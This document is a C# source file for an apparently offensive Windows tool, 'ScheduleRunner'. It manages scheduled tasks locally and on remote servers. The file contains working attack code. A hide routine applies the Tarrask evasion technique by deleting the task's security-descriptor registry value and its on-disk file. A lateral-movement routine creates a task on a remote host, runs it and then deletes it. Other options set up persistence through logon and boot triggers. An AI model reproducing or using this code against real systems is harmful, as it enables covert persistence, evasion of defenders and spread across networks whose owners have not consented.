using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Linq;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Collections.Generic;

namespace ScheduleRunner
{
    class TaskManager
    {
        // API used to avoid redirecting to SYSWOW64 folder
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int Wow64DisableWow64FsRedirection(ref IntPtr ptr);

        public TaskManager(String method, String taskName, String folder, String author, String description, String trigger, String program, String argument, String user, String modifier, String startTime, String remoteServer, bool hide) {
            Helper.Banner();
            try
            {
                if (method.ToLower().Equals("create"))
                    CreateScheduledTask(taskName, folder, author, description, trigger, program, argument, user, modifier, startTime, remoteServer, hide);
                else if (method.ToLower().Equals("delete"))
                    RemoveScheduledTask(taskName, folder, remoteServer, null, hide);
                else if (method.ToLower().Equals("run"))
                    RunScheduledTask(taskName, folder, remoteServer, null);
                else if (method.ToLower().Equals("query"))
                    ListScheduledTasks(taskName, folder, remoteServer);
                else if (method.ToLower().Equals("queryfolders"))
                    ListAllFolders(remoteServer);
                else if (method.ToLower().Equals("move"))
                    LateralMovement(taskName, folder, author, description, trigger, program, argument, user, modifier, startTime, remoteServer);
                else
                    Console.WriteLine("[-] Error: Unknown method.");
            }
            catch (Exception)
            {
                Console.WriteLine("[-] Error: Unknown method.");
            }
        }

        // Check if current user is "NT AUTHOIRTY\SYSTEM"
        bool CheckIsSystem() {
            string currentUser = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            if (currentUser == @"NT AUTHORITY\SYSTEM")
                return true;
            else
                return false;
        }

        // https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/
        // Technique - hidding scheduled task
        void HideScheduledTask(String taskName) {
            Console.WriteLine("[+] Executing technique - hiding scheduled task...");
            String treeKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\";

            // Avoid redirecting to syswow64
            IntPtr val = IntPtr.Zero;
            Wow64DisableWow64FsRedirection(ref val);

            try
            {
                Console.WriteLine("[+] Removing 'SD' value from '" + treeKey + taskName + "'...");
                RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(treeKey + taskName, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.WriteKey).DeleteValue("SD");
            }
            catch (Exception e)
            {
                if(e is UnauthorizedAccessException || e is SecurityException)
                    Console.WriteLine("[-] Error: You do not have sufficient permission to hide the scheduled task.");
                else
                    Console.WriteLine("[-] Error: Error when hiding the scheduled task.");
                return;
            }

            String pathToDelete = Path.Combine(@"C:\Windows\System32\Tasks\" + taskName);
            try
            {
                Console.WriteLine("[+] Removing scheduled task on disk artifact - '" + pathToDelete + "'...");
                File.Delete(pathToDelete);
            }
            catch (Exception e)
            {
                if (e is IOException)
                    Console.WriteLine("[-] Error: The '" + pathToDelete + "' file is in use by other process.");
                else if (e is DirectoryNotFoundException)
                    Console.WriteLine("[-] Error: The path '" + pathToDelete + "' is invalid.");
                else
                    Console.WriteLine("[-] Error: Unknown error while deleting the scheduled task on-disk artifact - '" + pathToDelete + "'.");
                return;
            }

            Console.WriteLine("[+] The scheduled task is hidden and invisible now.");
        }

        // Delete hidden scheduled task
        void RemoveHiddenScheduledTask(String taskName) {
            String treeKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\";
            String taskKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\";

            // Avoid redirecting to syswow64
            IntPtr val = IntPtr.Zero;
            Wow64DisableWow64FsRedirection(ref val);

            try
            {
                RegistryKey treeSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(treeKey + taskName, RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadKey);
                
                if (treeSubKey == null)
                {
                    Console.WriteLine("[-] Error: The scheduled task does not exist.");
                    return;
                }

                Console.WriteLine("[+] Deleting the scheduled task: " + taskName + "...");
                object id = treeSubKey.GetValue("Id");
                RegistryKey taskSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(taskKey + id, RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadKey);
                if (taskSubKey != null)
                    RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).DeleteSubKeyTree(taskKey + id);
                RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).DeleteSubKeyTree(treeKey + taskName);
            }
            catch (Exception e)
            {
                if (e is UnauthorizedAccessException || e is SecurityException)
                    Console.WriteLine("[-] Error: You do not have sufficient permission to remove the scheduled task.");
                else
                    Console.WriteLine("[-] Error: Unknown error while deleting the scheduled task.");
                return;
            }

            String pathToDelete = Path.Combine(@"C:\Windows\System32\Tasks\" + taskName);
            try
            {
                Console.WriteLine("[+] Removing scheduled task on disk artifact - '" + pathToDelete + "'...");
                File.Delete(pathToDelete);
            }
            catch (Exception e)
            {
                if (e is IOException)
                    Console.WriteLine("[-] Error: The '" + pathToDelete + "' file is in use by other process.");
                else if (e is DirectoryNotFoundException)
                    Console.WriteLine("[-] Error: The path ('" + pathToDelete + "' is invalid.");
                else
                    Console.WriteLine("[-] Error: Unknown error while deleting the scheduled task on-disk artifact - '" + pathToDelete + "'.");
                return;
            }

            Console.WriteLine("[+] The scheduled task is deleted. However, The deleted scheduled task would continue to run according to the defined triggers until the system rebooted.");
        }

        // Validate the scheduled task is using 'hide' technique before deletion
        bool CheckIsHiddenScheduledTask(String taskName) {
            String treeKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\";
            object sd;
            RegistryKey treeSubKey;

            try
            {
                treeSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(treeKey + taskName, RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadKey);
                if (treeSubKey == null)
                {
                    Console.WriteLine("[-] Error: The scheduled task does not exist.");
                    return false;
                }

                sd = treeSubKey.GetValue("SD");

                if (sd == null)
                    return true;
                else
                {
                    Console.WriteLine("[-] Error: Your task is not using hidden scheduled task technique. You should remove '/technique:hide' to properly delete the task.");
                    return false;
                }
            }
            catch (Exception e)
            {
                if (e is UnauthorizedAccessException || e is SecurityException)
                    Console.WriteLine("[-] Error: You do not have sufficient permission to validate the existence of the scheduled task in registry.");
                else
                    Console.WriteLine("[-] Error: Unkonwn error while checking the scheduled task via registry.");
                return false;
            }
        }

        TaskService CreateScheduledTask(String taskName, String folder, String author, String description, String trigger, String program, String argument, String user, String modifier, String startTime, String remoteServer, bool hide) {
            try
            {
                // Check key parameters
                if (taskName == null || trigger == null || program == null)
                {
                    Console.WriteLine("[-] Error: Missing parameters. \"/taskname, /program, /trigger\" must be defined. Please try again.");
                    return null;
                }

                // Check technique - hiding scheduled task
                if (hide)
                {
                    if (remoteServer != null)
                    {
                        Console.WriteLine("[-] Error: Technique (hiding scheduled task) does not support remote server since 'Remote Registry' service is ran by Local Service only.");
                        return null;
                    }
                    else if (!CheckIsSystem())
                    {
                        Console.WriteLine("[-] Error: Using technique (hiding scheduled task) requires NT AUTHORITY\\SYSTEM.");
                        return null;
                    }
                }

                TaskService ts;

                // Validate remote access
                if (remoteServer != null)
                {
                    ts = GetRemoteTaskService(remoteServer);
                    if (ts == null)
                        return null;
                    if (user == null)
                        user = "NT AUTHORITY\\SYSTEM";
                }
                else
                {
                    ts = new TaskService();
                    if (ts == null)
                        return null;
                    if (user == null)
                        user = WindowsIdentity.GetCurrent().Name;
                }

                // Check if the folder exists
                if (folder != null)
                {
                    bool folderIsExist = true;
                    if (folder.EndsWith("\\"))
                    {
                        folderIsExist = CheckIfFolderExists(ts, folder.Remove(folder.Length - 1));
                    }
                    else
                    {
                        folderIsExist = CheckIfFolderExists(ts, folder);
                        folder += "\\";
                    }
                    if (!folderIsExist)
                    {
                        Console.WriteLine("[-] Error: The folder does not exist.");
                        return null;
                    }
                    taskName = folder + taskName;
                }

                TaskDefinition td = ts.NewTask();

                // Define trigger
                if (trigger.Equals("weekly"))
                {
                    if (startTime == null)
                    {
                        Console.WriteLine("[-] Error: The starttime is not defined. Please try again. For example, \"/starttime:23:30\" to repeat the task daily at 11:30pm.");
                        return null;
                    }
                    if (modifier == null)
                    {
                        Console.WriteLine("[-] Error: The modifier is not defined. Please try again. For example, use \"/modifier:mon,sat,sun\" to repeat the task every Monday, Saturday and Sunday.");
                        return null;
                    }
                    try
                    {
                        List<string> daysofweekmodifier = modifier.Split(',').ToList();
                        DaysOfTheWeek daysofweek = 0;
                        foreach (string day in daysofweekmodifier)
                        {
                            switch (day.ToLower())
                            {
                                case "mon":
                                case "monday":
                                    daysofweek += 2;
                                    break;
                                case "tue":
                                case "tuesday":
                                    daysofweek += 4;
                                    break;
                                case "wed":
                                case "wednesday":
                                    daysofweek += 8;
                                    break;
                                case "thurs":
                                case "thursday":
                                    daysofweek += 16;
                                    break;
                                case "fri":
                                case "friday":
                                    daysofweek += 32;
                                    break;
                                case "sat":
                                case "saturday":
                                    daysofweek += 64;
                                    break;
                                case "sun":
                                case "sunday":
                                    daysofweek += 1;
                                    break;
                            }
                        }
                        if (daysofweek == 0)
                        {
                            Console.WriteLine("[-] Error: The format of the \"/modifier:\" parameter is incorrect. Please try again. For example, use \"/modifier:mon,sat,sun\" to repeat the task every Monday, Saturday and Sunday.");
                            return null;
                        }
                        int hour = Int16.Parse(startTime.Split(':')[0]);
                        int minute = Int16.Parse(startTime.Split(':')[1]);
                        WeeklyTrigger dt = new WeeklyTrigger();
                        dt.StartBoundary = DateTime.Today + TimeSpan.FromHours(hour) + TimeSpan.FromMinutes(minute);
                        dt.DaysOfWeek = daysofweek;
                        td.Triggers.Add(dt);
                    }
                    catch (FormatException)
                    {
                        Console.WriteLine("[-] Error: Wrong time format for \"/starttime:\" or \"/modifier:\". Please try again. For example, use \"/starttime:23:30\" \"/modifier:mon,sat,sun to repeat the task every Monday, Saturday, and Sunday at 11:30pm.");
                        return null;
                    }
                }
                else if (trigger.Equals("daily"))
                {
                    if (startTime == null)
                    {
                        Console.WriteLine("[-] Error: The starttime is not defined. Please try again. For example, \"/starttime:23:30\" to repeat the task daily at 11:30pm.");
                        return null;
                    }
                    try
                    {
                        int hour = Int16.Parse(startTime.Split(':')[0]);
                        int minute = Int16.Parse(startTime.Split(':')[1]);
                        DailyTrigger dt = new DailyTrigger();
                        dt.StartBoundary = DateTime.Today + TimeSpan.FromHours(hour) + TimeSpan.FromMinutes(minute);
                        dt.DaysInterval = 1;
                        td.Triggers.Add(dt);
                    }
                    catch (FormatException)
                    {
                        Console.WriteLine("[-] Error: Wrong time format for \"/starttime:\". Please try again. For example, use \"/starttime:23:30\" to repeat the task daily at 11:30pm.");
                        return null;
                    }
                }
                else if (trigger.Equals("hourly"))
                {
                    TimeTrigger tt = new TimeTrigger();
                    if (modifier == null)
                    {
                        Console.WriteLine("[-] Error: The modifier is not defined. Please try again. For example, use \"/modifier:4\" to repeat the task every 4 hours.");
                        return null;
                    }
                    if (Int16.Parse(modifier) <= 23)
                    {
                        tt.Repetition.Interval = TimeSpan.FromHours(Int16.Parse(modifier));
                    }
                    else
                    {
                        Console.WriteLine("[-] Error: The modifier for hourly trigger should be lower than 24 hours. Please try again.");
                        return null;
                    }
                    td.Triggers.Add(tt);
                }
                else if (trigger.Equals("minute"))
                {
                    TimeTrigger tt = new TimeTrigger();
                    if (modifier == null)
                    {
                        Console.WriteLine("[-] Error: The modifier is not defined. Please try again. For example, use \"/modifier:60\" to repeat the task every 60 minutes.");
                        return null;
                    }
                    if (Int16.Parse(modifier) <= 1439)
                    {
                        tt.Repetition.Interval = TimeSpan.FromMinutes(Int16.Parse(modifier));
                    }
                    else
                    {
                        Console.WriteLine("[-] Error: The modifier for minute trigger should be lower than 1439 minutes. Please try again.");
                        return null;
                    }
                    td.Triggers.Add(tt);
                }
                else if (trigger.Equals("onlogon"))
                {
                    LogonTrigger lt = new LogonTrigger();
                    lt.UserId = user;
                    td.Triggers.Add(lt);
                }
                else if (trigger.Equals("onstart"))
                {
                    BootTrigger bt = new BootTrigger();
                    td.Triggers.Add(bt);
                }
                else if (trigger.Equals("onidle"))
                {
                    IdleTrigger it = new IdleTrigger();
                    td.Triggers.Add(it);
                }
                else
                {
                    Console.WriteLine("[-] Error: No such schedule type. Please try again.");
                    return null;
                }

                // Add command line argument
                td.Actions.Add(program, argument, null);

                // Setting for the scheduled task
                td.Settings.DisallowStartIfOnBatteries = false;
                td.Settings.StopIfGoingOnBatteries = false;
                td.Settings.Enabled = true;
                td.RegistrationInfo.Description = description;
                td.RegistrationInfo.Author = author;

                // Specific user who executes the scheduled task
                td.Principal.UserId = user;

                // Register the task in the root folder
                Console.WriteLine("[+] Creating the scheduled task: " + taskName + "...");
                ts.RootFolder.RegisterTaskDefinition(taskName, td);

                // Check if the newly created scheduled task exists
                if (CheckIfScheduledTaskExists(ts, taskName))
                {
                    Console.WriteLine("[+] The scheduled task is created.");
                    if (hide)
                        HideScheduledTask(taskName);
                    return ts;
                }
                else
                {
                    Console.WriteLine("[-] Error: Unknown error. The scheduled task was not created.");
                    return null;
                }
            }
            catch (Exception e)
            {
                if (e is UnauthorizedAccessException)
                    Console.WriteLine("[-] Error: You do not have sufficient permission to create the scheduled task.");
                else if (e is COMException)
                {
                    if (e.HResult.ToString("x") == "800706b5")
                        Console.WriteLine("[-] Error: The interface is unknown. Probably the Schedule service is down?");
                    else if (e.HResult.ToString("x") == "80070534")
                        Console.WriteLine("[-] Error: The user name could not be found.");
                    else
                        Console.WriteLine("[-] Error: " + e.Message);
                }
                else
                    Console.WriteLine("[-] Error: Error when creating the scheduled task. Please check your parameters again.");
                return null;
            }
        }

        void RemoveScheduledTask(String taskName, String folder, String remoteServer, TaskService ts, bool hide) {
            // Check key parameters
            if (taskName == null)
            {
                Console.WriteLine("[-] Error: Missing parameter. \"/taskname\" must be defined. Please try again.");
                return;
            }

            // Validate setup for removing hidden scheduled task
            if (hide)
            {
                if (remoteServer != null)
                {
                    Console.WriteLine("[-] Error: Technique (hiding scheduled task) does not support remote server since 'Remote Registry' service is ran by Local Service only.");
                    return;
                }
                else if (!CheckIsSystem())
                {
                    Console.WriteLine("[-] Error: Removing hidden scheduled task requires NT AUTHORITY\\SYSTEM.");
                    return;
                }
            }

            if (ts == null)
            { 
                // Validate remote access
                if (remoteServer != null)
                {
                    ts = GetRemoteTaskService(remoteServer);
                    if (ts == null)
                        return;
                }
                else
                    ts = new TaskService();
            }

            // Check if the folder exists
            if (folder != null)
            {
                bool folderIsExist;
                if (folder.EndsWith("\\"))
                {
                    folderIsExist = CheckIfFolderExists(ts, folder.Remove(folder.Length - 1));
                }
                else
                {
                    folderIsExist = CheckIfFolderExists(ts, folder);
                    folder = folder + "\\";
                }
                if (!folderIsExist)
                {
                    Console.WriteLine("[-] Error: The folder does not exist.");
                    return;
                }
                taskName = folder + taskName;
            }

            if (hide)
            {
                if (CheckIsHiddenScheduledTask(taskName))
                    RemoveHiddenScheduledTask(taskName);
            }
            else
            {
                // Check if the task exists
                if (CheckIfScheduledTaskExists(ts, taskName))
                {
                    try
                    {
                        // Start deleting the task
                        Console.WriteLine("[+] Deleting the scheduled task: " + taskName + "...");
                        ts.RootFolder.DeleteTask(taskName);
                    }
                    catch (Exception e)
                    {
                        if (e is UnauthorizedAccessException)
                            Console.WriteLine("[-] Error: Access is denied.");
                        else
                            Console.WriteLine("[-] Error: Unkonwn error while deleting the scheduled task.");
                        return;

                    }

                    if (!CheckIfScheduledTaskExists(ts, taskName))
                    {
                        Console.WriteLine("[+] The scheduled task is deleted.");
                    }
                    else
                    {
                        Console.WriteLine("[-] Error: The scheduled task cannot be deleted.");
                    }
                }
                else
                {
                    Console.WriteLine("[-] Error: The scheduled task does not exist.");
                }
            }
        }

        void RunScheduledTask(String taskName, String folder, String remoteServer, TaskService ts) {
            // Check key paramters
            if (taskName == null)
            {
                Console.WriteLine("[-] Error: Missing parameter. \"/taskname\" must be defined. Please try again.");
                return;
            }

            if (ts == null)
            {
                // Validate remote access
                if (remoteServer != null)
                {
                    ts = GetRemoteTaskService(remoteServer);
                    if (ts == null)
                        return;
                }
                else
                    ts = new TaskService();
            }
            
            // Check if the folder exists
            if (folder != null)
            {
                bool folderIsExist;
                if (folder.EndsWith("\\"))
                {
                    folderIsExist = CheckIfFolderExists(ts, folder.Remove(folder.Length - 1));
                }
                else
                {
                    folderIsExist = CheckIfFolderExists(ts, folder);
                    folder += "\\";
                }
                if (!folderIsExist)
                {
                    Console.WriteLine("[-] Error: The folder does not exist.");
                    return;
                }
                taskName = folder + taskName;
            }

            Task t = ts.GetTask(taskName);

            // Execute the task if exists
            if (t == null)
            {
                Console.WriteLine("[-] Error: The scheduled task does not exist.");
                return;
            }
            else
            {
                Console.WriteLine("[+] Running the scheduled task: " + taskName + "...");
                try
                {
                    t.Run();
                    Console.WriteLine("[+] The scheduled task is started.");
                }
                catch (Exception)
                {
                    Console.WriteLine("[-] Error: The scheduled task cannot be started.");
                    return;
                }
            }
        }

        void ListScheduledTasks(String taskName, String folder, String remoteServer) {
            if (taskName != null)
                ListDetailsForScheduledTask(taskName, folder, remoteServer);
            else
            {
                TaskService ts;
                if (remoteServer != null)
                {
                    ts = GetRemoteTaskService(remoteServer);
                    if (ts == null)
                        return;
                }
                else
                    ts = new TaskService();
                if (folder != null)
                {
                    if (folder.EndsWith("\\"))
                    {
                        folder = folder.Remove(folder.Length - 1);
                    }
                    ListScheduledTasksInFolder(ts.GetFolder(folder), remoteServer);
                }
                else
                    ListScheduledTasksInFolder(ts.RootFolder, remoteServer);
            }
        }
        
        void ListDetailsForScheduledTask(String taskName, String folder, String remoteServer) {
            TaskService ts;

            // Validate remote access
            if (remoteServer != null)
            {
                ts = GetRemoteTaskService(remoteServer);
                if (ts == null)
                    return;
            }
            else
                ts = new TaskService();

            // Check if the folder exists
            if (folder != null)
            {
                bool folderIsExist = true;
                if (folder.EndsWith("\\"))
                {
                    folderIsExist = CheckIfFolderExists(ts, folder.Remove(folder.Length - 1));
                }
                else
                {
                    folderIsExist = CheckIfFolderExists(ts, folder);
                    folder = folder + "\\";
                }
                if (!folderIsExist)
                {
                    Console.WriteLine("[-] Error: The folder does not exist.");
                    return;
                }
                taskName = folder + taskName;
            }

            if (!CheckIfScheduledTaskExists(ts, taskName))
            {
                Console.WriteLine("[-] Error: The scheduled task does not exist.");
                return;
            }
            else
            {
                Task t = ts.GetTask(taskName);
                Console.WriteLine("Task name: " + t.Name);
                Console.WriteLine("Task folder: " + t.Folder);
                Console.WriteLine("Task full path: " + t.Path);
                Console.WriteLine("Task state: " + t.State);
                Console.WriteLine("Task enabled: " + t.Enabled);
                Console.WriteLine("Task last run time: " + t.LastRunTime);
                Console.WriteLine("Task next run time: " + t.NextRunTime);
                Console.WriteLine("Task XML: \n" + t.Xml);
            }
        }
        void ListScheduledTasksInFolder(TaskFolder fld, String remoteServer) {
            if (fld == null)
            {
                Console.WriteLine("[-] Error: This folder cannot be found.");
                return;
            }
            Console.WriteLine("[+] Current folder: " + fld.ToString());

            Console.WriteLine("[+] Getting sub folders...");

            foreach (TaskFolder tf in fld.SubFolders)
            {
                Console.WriteLine("----------------------------------------------------------------------");
                Console.WriteLine("Sub folder name: " + tf.Path);
                String argumentForRemoteServer = "";
                if (remoteServer != null)
                    argumentForRemoteServer = " /remoteserver:" + remoteServer;
                Console.WriteLine("Command to check for sub folder details: ScheduleRunner.exe /method:query /folder:\"" + tf.Path + "\""  + argumentForRemoteServer);
            }
            Console.WriteLine("----------------------------------------------------------------------");
            Console.WriteLine("[+] Number of sub folder(s): " + fld.SubFolders.Count);


            Console.WriteLine("\r\n\r\n[+] Getting tasks...");
            foreach (Task t in fld.Tasks)
            {
                Console.WriteLine("----------------------------------------------------------------------");
                Console.WriteLine("Task name: " + t.Name);
                Console.WriteLine("Task folder: " + t.Folder);
                Console.WriteLine("Task full path: " + t.Path);
                String argumentForRemoteServer = "";
                if (remoteServer != null)
                    argumentForRemoteServer = " /remoteserver:" + remoteServer;
                if (t.Folder.ToString() == "\\")
                    Console.WriteLine("Command to check for task details: ScheduleRunner.exe /method:query /taskname:\"" + t.Name + "\"" + argumentForRemoteServer);
                else
                    Console.WriteLine("Command to check for task details: ScheduleRunner.exe /method:query /taskname:\"" + t.Name + "\" /folder:\"" + t.Folder + "\"" + argumentForRemoteServer);
            }
            Console.WriteLine("----------------------------------------------------------------------");
            Console.WriteLine("[+] Number of task(s): " + fld.Tasks.Count);
        }

        void ListAllFolders(String remoteServer) {
            TaskService ts;
            if (remoteServer != null)
            {
                ts = GetRemoteTaskService(remoteServer);
                if (ts == null)
                    return;
            }
            else
                ts = new TaskService();
            Console.WriteLine("[+] Listing all folders.");
            Console.WriteLine("----------------------------------------------------------------------");
            ListSubFolders(ts.RootFolder);
        }

        void ListSubFolders(TaskFolder fld) {
            foreach (TaskFolder sfld in fld.SubFolders)
            {
                Console.WriteLine(sfld.Path);
                ListSubFolders(sfld);
            }
        }

        void LateralMovement(String taskName, String folder, String author, String description, String trigger, String program, String argument, String user, String modifier, String startTime, String remoteServer) {
            if (remoteServer == null || taskName == null || program == null)
            {
                Console.WriteLine("[-] Error: Missing parameters. \"/remoteserver, /taskname, /program\" must be defined. Please try again.");
                return;
            }
            if (trigger == null)
                trigger = "onlogon";
            TaskService ts = CreateScheduledTask(taskName, folder, author, description, trigger, program, argument, user, modifier, startTime, remoteServer, false);
            if (ts != null)
            {
                RunScheduledTask(taskName, folder, remoteServer, ts);
                RemoveScheduledTask(taskName, folder, remoteServer, ts, false);
            }
        }

        bool CheckIfScheduledTaskExists(TaskService ts, String taskName) {
            Task t = ts.GetTask(taskName);
            if (t == null)
                return false;
            else
                return true;
        }

        bool CheckIfFolderExists(TaskService ts, String folder) {
            TaskFolder tf = ts.GetFolder(folder);
            if (tf == null)
                return false;
            else
                return true;
        }

        TaskService GetRemoteTaskService(String remoteServer) {
            try
            {
                Console.WriteLine("[+] Connecting to target server: " + remoteServer + "...");
                TaskService ts = new TaskService(remoteServer);
                Console.WriteLine("[+] Connected to " + remoteServer + ".");
                return ts;
            }
            catch (FileNotFoundException)
            {
                Console.WriteLine("[-] Error: The network path was not found.");
                return null;
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("[-] Error: Access is denied.");
                return null;
            }
            catch (Exception)
            {
                Console.WriteLine("[-] Error: Unknown error while accessing remote server.");
                return null;
            }
        }
    }
}
